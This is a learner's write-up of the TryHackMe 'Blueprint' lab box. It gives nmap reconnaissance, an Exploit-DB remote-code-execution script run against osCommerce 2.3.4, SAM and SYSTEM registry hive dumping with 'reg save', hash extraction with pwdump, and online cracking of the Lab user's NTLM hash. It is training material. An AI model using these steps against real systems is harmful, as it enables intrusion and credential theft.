## TryHackMe - Blueprint Methodology
> Completed 16th March 2022

This is the attack methodology I used for TryHackMe's Blueprint box.
I have based this document on a general concept of the intrusion kill-chain:
Reconnaissance > Weaponization > Delivery > Exploitation > Installation > Command & Control > Actions on Objective

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Python

### Methodology
#### Objectives/Flags
 1. "Lab" user NTML hash decrypted
 2. root.txt
 
#### Reconnaissance
First I checked for open ports using a basic nmap scan
```bash
nmap -t4 <TargetIP>
```
```
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
512/tcp   filtered exec
1152/tcp  filtered winpoplanmess
1875/tcp  filtered westell-stats
3306/tcp  open     mysql
4662/tcp  filtered edonkey
7741/tcp  filtered scriptview
8080/tcp  open     http-proxy
9010/tcp  filtered sdr
20005/tcp filtered btx
26214/tcp filtered unknown
27000/tcp filtered flexlm0
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49158/tcp open     unknown
49159/tcp open     unknown
49160/tcp open     unknown
```
I could see some HTTP open ports and decided to see what was accessible
```
http://<TargetIP>:8080/
  http://<TargetIP>:8080/oscommerce-2.3.4/catalog/
```
I could determine the framework being used for the commerce page was oscommerce-2.3.4. Using this information I visited Exploit-DB to see what was available.
```
https://www.exploit-db.com/exploits/50128
```

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
Using the remote-code-execution exploit from the DB, the target was attacked
```
python 50128.py http://<TargetIP>:8080/oscommerce-2.3.4/catalog/
```
Once the attack was successful, I now had RCE shell access into the target.

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
I started by trying to determine the nature of the host and explore it's file directories
```
whoami
  nt autheority\system
```
```
DIR C:\users
  Administrator
    C:\users\Administrator\Desktop\root.txt.txt
      more C:\users\Administrator\Desktop\root.txt.txt
        THM{*}
  DefaultAppPool
  Lab
```
The filesystem was Windows and exploring user files I happened to come across my first objective ```root.txt.txt```. According to my mentor the filename was done this way to obfuscate it from broad searches.
My next objective was to locate and extract the NTML hash of the "Lab" user.

I must admit I didn't know what NTML was or where it was found however I had a reasonable understanding through hack-sims that this was going to be a hashed password found somewhere on the system. After some googling I was able to understand that this hash was most likely going to be in the Windows "SAM" file generally located at ```C:\Windows\system32\config\SAM```. (source: https://security.stackexchange.com/questions/113295/location-of-password-hashes-on-a-windows-local-machine)
```
DIR C:\Windows\system32\config\
```
I could see that the file existed on the system and my goal was to now try and exfiltrate this file/data out of the target to my local machine. I had a lot of trial and error trying to get at this file. Various failures included printing its contents, copying it to the visible HTTP directory, Uploading it to a local-http/ftp server.
Eventually I stumbled upon a page which explained how this data could be exported from its registry key. (source: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)
```
reg save hklm\system system
reg save hklm\sam sam
```
With the data exported out of the system-files I could now move them around without any system-protection. I moved these files to the visible HTTP directory.
```
copy <missing> http://<TargetIP>:8080/oscommerce-2.3.4/docs/
```
From my localhost I was able to save these files. My next step was to dump the hashes out of the files. Using the website, I had found earlier I had to find a tool that was going to assist me.
```
python pwdump.py /home/kali/tools/TryHackMe/Blueprint/system /home/kali/tools/TryHackMe/Blueprint/sam
  Administrator:500:<hash>:<hash>:::
  Guest:501:<hash>:<hash>:::
  Lab:1000:<hash>:<hash>:::
```
Success, I've got the hash of the "Lab" user and now needed to decrypt this. I spent some time trying to mess with HashCat to crack it but after some more googling I was directed to Crackstation.
```
https://crackstation.net/
   Insert <hash> -> crack
     <password>
```
I spared my system it's resources and was able to instantly receive the cleartext password.

---
### After-action
#### What I've learned
This was the first "real" box that I've had a go at and had a blast from the whole experience. My mentor had helped me connect the dots on reconnaissance and exploitation through finding online resources/code. Once I was in, most of my frustrations was trying to understand what NTML was and more specifically how I was going to extract that information to my localhost. Lastly why burn the computing power when an online service can crack passwords for you?

#### What I would've done differently
Given that this was my first box, I was a bit messy with what I was actually doing on the target Machine. I had rebooted it by attempting to run arbitrary files and possibly executed programs in trial and error.
I would like to record what actions I had taken (including timestamps?) and what failures I had run into for posterity/documentation.
Lastly, I should have spent the extra effort in removing the extracted system files from the export location and even the visible HTTP directory to reduce my footprint.
